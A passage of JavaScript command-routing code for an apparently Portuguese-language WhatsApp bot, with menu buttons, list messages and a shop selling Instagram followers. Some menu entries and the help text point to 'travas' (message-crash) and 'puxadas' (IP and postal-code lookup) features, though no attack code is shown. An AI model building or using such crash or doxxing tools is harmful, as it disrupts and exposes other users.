[{buttonId: `${prefix}lista1`, buttonText: {displayText: `[ü©∏] ùêåùêÑùêçùêîùêí ùêãùêàùêíùêìùêÄ [ü©∏]`}, type: 1},
{buttonId: `${prefix}menudono`, buttonText: {displayText: `[ü©∏] ùêåùêÑùêçùêî ùêÉùêéùêçùêé [ü©∏]`}, type: 1},
{buttonId: `${prefix}lojinha`, buttonText: {displayText: `[ü©∏] ùêíùêÑùêÜùêîùêàùêÉùêéùêëùêÑùêí ùêàùêçùêíùêìùêÄ [ü©∏]`}, type: 1}], selo) 
break


case 'menudono':
case 'donomenu':  
if (!SoDono) return reply('ùêèùê®ùêßùê°ùêö-ùê¨ùêû ùêçùê® ùêíùêûùêÆ ùêãùêÆùê†ùêöùê´ ùêçùêöÃÉùê® ùêéùêÆùê¨ùêû ùêÄùê¨ùê¨ùêÆùê¶ùê¢ùê´ ùêö ùêèùê®ùê¨ùê¢ùêúÃßùêöÃÉùê® ùêÉùêû ùêëùêûùê¢ ùêíùêûùêßùêùùê® ùêìùêöÃÉùê® ùêÖùê´ùêöùêúùê®.')
pl.sendMessage(from, { react: { text: `ü•ã`, key: m.key }})
bla = fs.readFileSync('audios/dono.mp3')
pl.sendMessage(from, {audio: bla, mimetype: 'audio/mp4', ptt:true}, {quoted: fvn})
sendBimg(from, `${logo}`, menudono(prefix), ` ${NomeDoBot} `, [
{buttonId: `${prefix}menuprem`, buttonText: {displayText: `[ü©∏] ùêåùêÑùêçùêî ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]`}, type: 1}, {buttonId: `${prefix}brincadeiras`, buttonText: {displayText:`[ü©∏] ùêÅùêëùêàùêçùêÇùêÄùêÉùêÑùêàùêëùêÄùêí [ü©∏]`}, type: 1}], selo) 
break 

case 'menufigurinhas':
case 'menufig':  
case 'figuu':
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
sendBimg(from, `${logo}`, figurinhas(prefix, pushname, numerodn, tempo, isGroup, groupName, NomeDoBot), ` ${NomeDoBot}  `, 
[{buttonId: `${prefix}pack-figu`, buttonText: {displayText: `[ü©∏] ùêèùêÄùêÇùêäùêí ùêíùêìùêàùêÇùêäùêÑùêë [ü©∏]`}, type: 1}], selo) 
break

case 'downloads':
case 'down':  
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
sendBimg(from, `${logo}`, downloads(prefix, pushname, numerodn, tempo, isGroup, groupName, NomeDoBot), `  ${NomeDoBot}  `, 
[{buttonId: `${prefix}lojinha`, buttonText: {displayText: `[ü©∏] ùêíùêÑùêÜùêîùêàùêÉùêéùêëùêÑùêí ùêàùêçùêíùêìùêÄ [ü©∏]`}, type: 1}], selo) 
break

case 'menuhentai':
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
sendBimg(from, `${logo}`, menu18(prefix, pushname, numerodn, tempo, isGroup, groupName, NomeDoBot), `  ${NomeDoBot}  `, 
[{buttonId: `${prefix}menuotaku`, buttonText: {displayText: `[ü©∏] ùêåùêÑùêçùêî ùêéùêìùêÄùêäùêî [ü©∏]`}, type: 1}], selo) 
break

case 'menuanime':
case 'menuotaku':
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
sendBimg(from, `${logo}`, menuotaku(prefix, pushname, numerodn, tempo, isGroup, groupName, NomeDoBot), `  ${NomeDoBot}  `, 
[{buttonId: `${prefix}menufig`, buttonText: {displayText: `[ü©∏] ùêÖùêàùêÜùêîùêëùêàùêçùêáùêÄùêí [ü©∏]`}, type: 1}], selo) 
break

case 'brincadeiras':
case 'brincadeira':
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
bla = fs.readFileSync('audios/brincadeiras.mp3')
pl.sendMessage(from, {audio: bla, mimetype: 'audio/mp4', ptt:true}, {quoted: fvn})
sendBimg(from, `${logo}`, brincadeiras(prefix, pushname, numerodn, tempo, isGroup, groupName, NomeDoBot), ` ${NomeDoBot} `, 
[{buttonId: `${prefix}menupremium`, buttonText: {displayText: `[ü©∏] ùêåùêÑùêçùêî ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]`}, type: 1}], selo) 
break

case 'menuprem':  
case 'menupremium':
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
wew = await getBuffer(`${logo}`) 
sendBimg(from, `${logo}`, menuprem(prefix, pushname, numerodn, tempo, isGroup, groupName, NomeDoBot), ` ${NomeDoBot} `, 
[{buttonId: `${prefix}menuadm`, buttonText: {displayText: `[ü©∏] ùêåùêÑùêçùêî ùêÄùêÉùêå [ü©∏]`}, type: 1}], selo) 
break 

case 'oq':
reply(`${tipo}`)
break

case 'menuadm':
case 'menuadms':
case 'adm': 
if (!SoDono)
if (!isGroupAdmins) return reply('ùêØùê®ùêúùêûÃÇ ùêßùêûùê¶ ùêûÃÅ ùêöùêùùê¶ ùêßùêöÃÉùê® ùê©ùê´ùêûùêúùê¢ùê¨ùêö ùêØùêûùê´ ùêûùê¨ùê≠ùêû ùê¶ùêûùêßùêÆ.')
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
bla = fs.readFileSync('audios/admin.mp3')
pl.sendMessage(from, {audio: bla, mimetype: 'audio/mp4', ptt:true}, {quoted: fvn})
sendBimg(from, `${logo}`, menuadm(prefix, pushname, numerodn, tempo, isGroup, groupName, NomeDoBot), ` ${NomeDoBot}  `, 
[{buttonId: `${prefix}infodono`, buttonText: {displayText: `[ü©∏] ùêàùêçùêÖùêé ùêÉùêéùêçùêé [ü©∏]`}, type: 1}], selo) 
break

case 'menutravas':
case 'travasmenu':
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
sendBimg(from, `${logo}`, menutravas(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}logos`, buttonText: {displayText: `[ü©∏] ùêåùêÑùêçùêî ùêãùêéùêÜùêéùêí [ü©∏]`}, type: 1}, {buttonId: `${prefix}puxadas`, buttonText: {displayText: `[ü©∏] ùêèùêîùêóùêÄùêÉùêÄùêí [ü©∏]`}, type: 1}], selo) 
break

case 'alteradores':
case 'menualteradores':
sendBimg(from, `${logo}`, alteradores(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `menu completo`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `info puxadas`}, type: 1}], selo) 
break

case 'menupuxadas':
case 'puxadas':
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
sendBimg(from, `${logo}`, menupuxadas(prefix), `${NomeDoBot}`, [
{buttonId: `${prefix}menu`, buttonText: {displayText: `[ü©∏] ùêåùêÑùêçùêî [ü©∏]`}, type: 1}, {buttonId: `${prefix}infopuxadas`, buttonText: {displayText: `[ü©∏] ùêàùêçùêÖùêé ùêÉùêéùêçùêé [ü©∏]`}, type: 1}], selo) 
break

/*

case 'lista1': 
case 'menulist': 
{
	timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
adivinhaa = info.key.id.length > 21 ? 'Android ü•¥' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE üîãüîå' : 'ZAP DA WEB üíª';
sections = [
{
title: "ESCOLHA UMA DA LISTA",
rows: [
{title: "[ü©∏] ùêåùêÑùêçùêî ùêèùêëùêàùêçùêÇùêàùêèùêÄùêã [ü©∏]", rowId: `${prefix}menu`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêãùêéùêÜùêéùêí [ü©∏]", rowId: `${prefix}menulogos`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÄùêÉùêå [ü©∏]", rowId: `${prefix}menuadm`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}menudono`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêèùêîùêóùêÄùêÉùêÄùêí [ü©∏]", rowId: `${prefix}puxadas`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêìùêëùêÄùêïùêÄùêí [ü©∏]", rowId: `${prefix}menutravas`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]", rowId: `${prefix}menupremium`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÄùêãùêìùêÑùêëùêÄùêÉùêéùêëùêÑùêí [ü©∏]", rowId: `${prefix}alteradores`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÄùêçùêàùêåùêÑ [ü©∏]", rowId: `${prefix}menuanime`},
{title: "[ü©∏] ùêåùêÑùêçùêî +ùüèùüñ [ü©∏]", rowId: `${prefix}menuhentai`},
{title: "[ü©∏] ùêÅùêëùêàùêçùêÇùêÄùêÉùêÑùêàùêëùêÄùêí [ü©∏]", rowId: `${prefix}brincadeiras`},
{title: "[ü©∏] ùêÄùêèùêãùêàùêÇùêÄùêìùêàùêïùêéùêí / ùêÅùêÄùêàùêóùêÄùêë [ü©∏]", rowId: `${prefix}lista-app`},
{title: "[ü©∏] ùêèùêÄùêÇùêä ùêÉùêÑ ùêÖùêàùêÜùêîùêëùêàùêçùêáùêÄùêí [ü©∏]", rowId: `${prefix}pack-figu`},
{title: "[ü©∏] ùêàùêçùêÖùêé ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}infodono`},
{title: "[ü©∏] ùêÉùêéùêñùêçùêãùêéùêÄùêÉùêí [ü©∏]", rowId: `${prefix}down`},
{title: "[ü©∏] ùêÖùêàùêÜùêîùêëùêàùêçùêáùêÄùêí [ü©∏]", rowId: `${prefix}menufig`},
{title: "[ü©∏] ùêàùêçùêÖùêé/ùêÄùêâùêîùêÉùêÄ [ü©∏]", rowId: `${prefix}infoajuda`},
{title: "[ü©∏] ùêÄùêäùêàùêçùêÄùêìùêéùêë [ü©∏]", rowId: `${prefix}akinator`},
{title: "[ü©∏] ùêÇùêéùêåùêèùêëùêÄùêë ùêé ùêÅùêéùêì [ü©∏]", rowId: `${prefix}alugar`, description: "compre a akame bot com seguran√ßa."},
{title: "[ü©∏] ùêÇùêéùêåùêèùêëùêÄùêë ùêíùêÑùêÜùêîùêàùêÉùêéùêëùêÑùêí [ü©∏]", rowId: `${prefix}lojinha`, description: "compre seguidores do Instagram com qualidade e seguran√ßa."}
]
},
]
 

const listMessage2 = {
text: `
‚ï≠‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚™©
‚îÉ‚ï≠‚ïê‚ïê‚ïê‚ïê ‚™©
‚îÉ‚îÇ‚û• [üë§] ùêéùêãùêÄÃÅ: ${pushname}
‚îÉ‚îÇ‚û• [üì≤] ùêÇùêÑùêãùêîùêãùêÄùêë: ${adivinhaa}
‚îÉ‚îÇ‚û• [‚ö°] ùêèùêàùêçùêÜ: ${latensie.toFixed(4)}
‚îÉ‚îÇ‚û• [ü©∏] ùêÅùêéùêì:  ${NomeDoBot} 
‚îÉ‚îÇ‚û• [üü¢] ùêÄùêìùêàùêïùêÄ: ${runtime(process.uptime())}
‚îÉ‚îÇ‚û• [üìå] ùêÉùêéùêçùêé: wa.me/${global.numerodonoa}
‚îÉ‚îÇ‚û• [‚è≥] ùêèùêãùêÄùêìùêÄùêÖùêéùêëùêåùêÄ: ${os.platform()}
‚îÉ‚ï∞‚ïê‚ïê‚ïê‚ïê ‚™®
‚ï∞‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚™® `,
  footer: ` ¬© Copyright by Yuri Modz `,
  title: ``,
  buttonText: "[ü©∏] ùêãùêàùêíùêìùêÄ ùêÉùêÑ ùêåùêÑùêçùêîùêí [ü©∏]",
  sections
}
sendMsg = await pl.sendMessage(from, listMessage2, {quoted: selo})
}
break

*/

case 'menulist': case 'lista1': {
	timestampe = speed();
qlatensie = speed() - timestampe
uptime = process.uptime()
sections = [
{
title: "ESCOLHA UMA DA LISTA",
rows: [
{title: "[ü©∏] ùêåùêÑùêçùêî ùêèùêëùêàùêçùêÇùêàùêèùêÄùêã [ü©∏]", rowId: `${prefix}menu`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêãùêéùêÜùêéùêí [ü©∏]", rowId: `${prefix}menulogos`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÄùêÉùêå [ü©∏]", rowId: `${prefix}menuadm`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}menudono`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêèùêîùêóùêÄùêÉùêÄùêí [ü©∏]", rowId: `${prefix}puxadas`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêìùêëùêÄùêïùêÄùêí [ü©∏]", rowId: `${prefix}menutravas`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêèùêëùêÑùêåùêàùêîùêå [ü©∏]", rowId: `${prefix}menupremium`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÄùêãùêìùêÑùêëùêÄùêÉùêéùêëùêÑùêí [ü©∏]", rowId: `${prefix}alteradores`},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÄùêçùêàùêåùêÑ [ü©∏]", rowId: `${prefix}menuanime`},
{title: "[ü©∏] ùêåùêÑùêçùêî +ùüèùüñ [ü©∏]", rowId: `${prefix}menuhentai`},
{title: "[ü©∏] ùêãùêàùêíùêì ùêñùêÄùêãùêãùêèùêÑùêèùêÑùêë [ü©∏]", rowId: `${prefix}menuwall`},
{title: "[ü©∏] ùêÅùêëùêàùêçùêÇùêÄùêÉùêÑùêàùêëùêÄùêí [ü©∏]", rowId: `${prefix}brincadeiras`},
{title: "[ü©∏] ùêÄùêèùêãùêàùêÇùêÄùêìùêàùêïùêéùêí / ùêÅùêÄùêàùêóùêÄùêë [ü©∏]", rowId: `${prefix}lista-app`},
{title: "[ü©∏] ùêèùêÄùêÇùêä ùêÉùêÑ ùêÖùêàùêÜùêîùêëùêàùêçùêáùêÄùêí [ü©∏]", rowId: `${prefix}pack-figu`},
{title: "[ü©∏] ùêàùêçùêÖùêé ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}infodono`},
{title: "[ü©∏] ùêÉùêéùêñùêçùêãùêéùêÄùêÉùêí [ü©∏]", rowId: `${prefix}down`},
{title: "[ü©∏] ùêÖùêàùêÜùêîùêëùêàùêçùêáùêÄùêí [ü©∏]", rowId: `${prefix}menufig`},
{title: "[ü©∏] ùêàùêçùêÖùêé/ùêÄùêâùêîùêÉùêÄ [ü©∏]", rowId: `${prefix}infoajuda`},
{title: "[ü©∏] ùêÄùêäùêàùêçùêÄùêìùêéùêë [ü©∏]", rowId: `${prefix}akinator`},
{title: "[ü©∏] ùêÇùêéùêåùêèùêëùêÄùêë ùêé ùêÅùêéùêì [ü©∏]", rowId: `${prefix}alugar`, description: "compre a akame bot com seguran√ßa."},
{title: "[ü©∏] ùêÇùêéùêåùêèùêëùêÄùêë ùêíùêÑùêÜùêîùêàùêÉùêéùêëùêÑùêí [ü©∏]", rowId: `${prefix}lojinha`, description: "compre seguidores do Instagram com qualidade e seguran√ßa."}
]
},
]
 

const listMessage2 = {
text: `
ùêíùêûùê•ùêûùêúùê¢ùê®ùêßùêû ùêé ùêåùêûùêßùêÆ ùêÉùêûùê¨ùêûùê£ùêöùêùùê®
`,
  footer: `¬© Copyright By Yuri Modz`,
  title: `ùêãùêàùêíùêìùêÄ ùêÉùêÑ ùêÇùêéùêåùêÄùêçùêÉùêéùêí`,
  buttonText: "[ü©∏] ùêãùêàùêíùêìùêÄ ùêÉùêÑ ùêåùêÑùêçùêîùêí [ü©∏]",
  sections
}
pl.sendMessage(from, listMessage2, {quoted: selo})
}
break


 case 'info':
 try {
ppimg = await pl.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
me = pl.user
uptime = process.uptime()
teks = `
‚ï≠‚îÄ‚ïº‚îÅ‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚îÅ‚ïæ‚îÄ‚ïÆ 
 *USUARIO*: ${pushname}
 *NOME DO BOT* : ${me.name}
 *N√öMERO DO BOT* : wa.me/${me.id.split('@')[0]}
 *PREFIX* : ${prefix}
 *O BOT ESTA ATIVO DESDE* : ${runtime(uptime)}
‚ï∞‚îÄ‚ïº‚îÅ‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚îÅ‚ïæ‚îÄ‚ïØ`
daftarimgg = await getBuffer(ppimg)
pl.sendMessage(from, {image: daftarimgg, caption: teks, mentions: [pl.user.id]})
break


case 'owner':
case 'odono':
case 'dono': 
case 'infodono':  
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
 numerodn = numerodonoa
sendBimg(from, `${logo}`, infodono(prefix, numerodn, NomeDoBot), ` ${NomeDoBot} `, [
{buttonId: `${prefix}gpofc`, buttonText: {displayText: `[ü©∏] ùêÜùêëùêîùêèùêé ùêéùêÖùêàùêÇùêàùêÄùêã [ü©∏]`}, type: 1}], selo) 
break

case 'logos':
case 'menulogo':
case 'menulogos':  
pl.sendMessage(from, { react: { text: `ü©∏`, key: m.key }})
wew = await getBuffer(`${logo}`) 
sendBimg(from, `${logo}`, menulogos(prefix, pushname, numerodn, tempo, isGroup, groupName, NomeDoBot), ` ${NomeDoBot} `, 
[{buttonId: `${prefix}lojinha`, buttonText: {displayText: `[ü©∏] ùêíùêÑùêÜùêîùêàùêÉùêéùêëùêÑùêí ùêàùêçùêíùêìùêÄ [ü©∏]`}, type: 1}], selo) 
break  


case 'lojinha':
bla = `
‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ
       ùêíùêÑùêÜùêîùêàùêÉùêéùêëùêÑùêí ùêåùêîùêçùêÉùêàùêÄùêí
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

[R$] 07,00 = 1 MIL SEGUIDORES
[R$] 12,00 = 2 MIL SEGUIDORES
[R$] 20,00 = 3 MIL SEGUIDORES
[R$] 30,00 = 7 MIL SEGUIDORES
[R$] 45,00 = 10 MIL SEGUIDORES

‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ
             ùêíùêÑùêÜùêîùêàùêÉùêéùêëùêÑùêí ùêÅùêë
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

[R$] 44,00 = 1 MIL SEGUIDORES
[R$] 88,00 = 2 MIL SEGUIDORES
[R$] 132,00 = 3 MIL SEGUIDORES
[R$] 220,00 = 5 MIL SEGUIDORES
[R$] 440,00 = 10 MIL SEGUIDORES

ùêïùêÑùêçùêÉùêÑùêÉùêéùêë: YURI MODZ
ùêèùêëùêéùêåùêéùêÇÃßùêÄÃÉùêé: 1¬∞ PEDIDO GANHA 500 A MAIS

‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ
           ùêéùêîùêìùêëùêéùêí ùêíùêÑùêëùêïùêàùêÇÃßùêéùêí
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

[üî¥] ùêòùêéùêîùêìùêîùêÅùêÑ
[üî¥] ùêìùêàùêäùêìùêéùêä
[üî¥] ùêäùêñùêáùêÄùêà
`
sendBimg(from, `${logo}`, bla, ` ${NomeDoBot} `, [
{buttonId: `${prefix}vendedor`, buttonText: {displayText: `[ü©∏] ùêÑùêçùêìùêëùêÄùêë ùêÑùêå ùêÇùêéùêçùêìùêÄùêìùêé [ü©∏]`}, type: 1}], selo)
break

case 'alugar':
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
 sections = [
    {
	title: " ESCOLHA UMA DA LISTA ",
	rows: [
{title: "[ü©∏] ùêÖùêÄùêãùêÄ ùêÇùêéùêå ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}vendedor`}
	]
    },
]
 

const listMessage2 = {
  text: `
‚ï≠‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïÆ

    ùêÄùêãùêîùêÜùêÄùêë  ùüè ùêåùêÑÃÇùêí = ùüëùüé ùêë$

    ùêÄùêäùêÄùêåùêÑ ùêïùüë = ùüíùüé ùêë$

    ùêÄùêäùêÄùêåùêÑ ùêïùüí = ùüîùüé ùêë$
      
‚ï∞‚îÄ‚ïº‚îÅ‚ïê‚ïê‚îÅ‚îÅ‚â∫ü©∏‚âª‚îÅ‚îÅ‚ïê‚ïê‚îÅ‚ïæ‚îÄ‚ïØ
`,
  buttonText: `[ü©∏] ùêÖùêÄùêãùêÄ ùêÇùêéùêå ùêÉùêéùêçùêé [ü©∏]` ,
  sections
}
sendMsg = await pl.sendMessage(from, listMessage2, {quoted: selo})
break


case 'infobot':
case 'infoajuda':
fakey(`
üÑºüÑ¥üÑΩüÖÑüÖ≥Ô∏éüÖ¥Ô∏éüÑ∞üÑπüÖÑüÑ≥üÑ∞

‚è§ÕüÕûÕüÕû‚õ•ùê®ùê•ùêöÃÅ ùê¨ùê®ùêÆ ùêö ùêÄùê§ùêöùê¶ùêû, ùê©ùêûùê´ùê¨ùê®ùêßùêöùê†ùêûùê¶ ùêùùê® ùêöùêßùê¢ùê¶ùêû: ùë®ùíåùíÇùíéùíÜ ùíàùíÇ ùë≤ùíäùíçùíç ùê¶ùêûùêÆ ùê¢ùêßùê≠ùêÆùê¢ùê≠ùê® ùêû ùêùùêû ùê¨ùêûùê´ùêØùê¢ùê´ ùê¶ùêûùêÆ ùêùùê®ùêßùê®, ùê¨ùêû ùêùùê¢ùêØùêûùê´ùê≠ùê¢ùê´ ùêûùê¶ ùê†ùê´ùêÆùê©ùê®ùê¨ ùêûùê≠ùêú...ùêöùê†ùê®ùê´ùêö ùê©ùê´ùêö ùê™ ùêûùêÆ ùê¨ùê¢ùê´ùêØùê® ùê¨ùê®ùêÆ ùêÆùê¶ùêö ùêõùê®ùê≠ ùê¶ùêÆùê•ùê≠ùê¢ ùê≠ùêöùê´ùêûùêüùêöùê¨ ùêùùê® ùêñùê°ùêöùê≠ùê¨ùêöùê©ùê© ùê©ùê´ùê®ùê†ùê´ùêöùê¶ùêöùêùùêö ùê©ùêûùê•ùê®

‚ò†Ô∏éÔ∏éùêéùê™ ùêûùêÆ ùêúùê®ùêßùê¨ùê¢ùê†ùê® ùêüùêöùê≥ùêûùê´? ùêúùê®ùê¶ùê® ùêûùêÆ ùêùùê¢ùê¨ùê¨ùêû ùê¨ùê®ùêÆ ùêÆùê¶ùêö ùêõùê®ùê≠ ùê¶ùêÆùê•ùê≠ùê¢ùê≠ùêöùê´ùêûùêüùêöùê¨  ùê©ùê®ùê¨ùê¨ùê® ùêúùê´ùê¢ùêöùê´ ùê©ùê®ùê´ ùêûùê±ùêûùê¶ùê©ùê•ùê® ùêüùê¢ùê†ùê¨,ùêõùêöùê¢ùê±ùêöùê´,ùê¶ùêÆÃÅùê¨ùê¢ùêúùêöùê¨,ùêØùê¢Ã®ùêùùêûùê®ùê¨,ùê©ùêÆùê±ùêöùê´ ùê¢ùê©,ùêúùêûùê© ùê®ùêÆ ùê©ùê´ùê®ùê≠ùêûùê†ùêûùê´ ùê¨ùêûùêÆ ùê†ùê´ùêÆùê©ùê®...ùê©ùê´ùêö ùê©ùê®ùêùùêûùê´ ùêÆùê≠ùê¢ùê•ùê¢ùê≥ùêöùê´ ùê¶ùêûùêÆùê¨ ùê¶ùêûùêßùêÆùê¨ ùêùùêû ùêúùê®ùê¶ùêöùêßùêùùê®ùê¨ ùêùùê¢ùê†ùê¢ùê≠ùêû "${prefix}menu/${prefix}help"...ùê©ùê´ùê®ùêßùê≠ùê® ùê£ùêöÃÅ ùê™ ùêØùêú ùê¨ùêöùêõùêû ùêöùê¨ ùêúùê®ùê¢ùê¨ùêöùê¨ ùêõùêöÃÅùê¨ùê¢ùêúùêöùê¨ ùêØùêöùê¶ùê®ùê¨ ùê©ùê´ùêö ùê®ùê™ ùê´ùêûùêöùê•ùê¶ùêûùêßùê≠ùêû ùê¢ùêßùê≠ùêûùê´ùêûùê¨ùê¨ùêöùê´·≠Ñ

ìÜ©Í™∂üÖ∏Ô∏éüÖΩÔ∏éüÖµÔ∏éüÖæÔ∏éüÑºüÑ¥üÑΩüÖÑÍ´ÇìÜ™

‚è§ÕüÕûÕüÕû‚úóùöñùöéùöóùöûùöäùöçùöñ: ùê¨ùêöÃÉùê® ùêúùê®ùê¶ùêöùêßùêùùê®ùê¨ ùê©ùêöùê´ùêö ùêöùêùùê¶ùê¨,ùê¨ùêûùê´ùêØùêû ùê©ùêöùê´ùêö ùêöùêÆùê±ùê¢ùê•ùê¢ùêöùê´ ùê®ùê¨ ùêöùêùùê¶ ùêûùê±ùêûùê¶ùê©ùê•ùê® ùêùùêû ùêúùê®ùê¶ùêöùêßùêùùê®ùê¨ ùê¨ùêûùê´ùêØùêû ùêúùê®ùê¶ùê® ùêûùê±ùêûùê¶ùê©ùê•ùê®: ùêöùêõùê´ùê¢ùê´ ùêû ùêüùêûùêúùê°ùêöùê´ùê†ùê©ùê¨(${prefix}grupo a/${prefix}grupo f)
ùê¶ùêöùê´ùêúùêöùê´(${prefix}marcar)
ùê©ùêûùê†ùêöùê´ ùê® ùê•ùê¢ùêßùê§ ùêùùê® ùê†ùê´ùêÆùê©ùê®(${prefix}linkgp) 
ùêõùêöùêßùê¢ùê´ ùêÆùê¶ ùêöùê•ùêØùê®(${prefix}ban: marque a mensagem do alvo)

‚è§ÕüÕûÕüÕû‚úóùöñùöéùöóùöûùöèùöíùöê:ùê® ùê¶ùêûùêßùêÆ ùêùùêû ùêüùê¢ùê† ùêû ùêÆùê¶ ùê¶ùêûùêßùêÆ ùêûùê¶ ùê™ùêÆùêû ùêØùêú ùêúùê´ùê¢ùêöùê´ ùê¨ùêÆùêöùê¨ ùêüùê¢ùê† ùêöùê≠ùê´ùêöùêØùêûùê¨ ùêùùêû ùêüùê®ùê≠ùê®ùê¨ ùê®ùêÆ ùêØùê¢Ã®ùêùùêûùê®ùê¨.
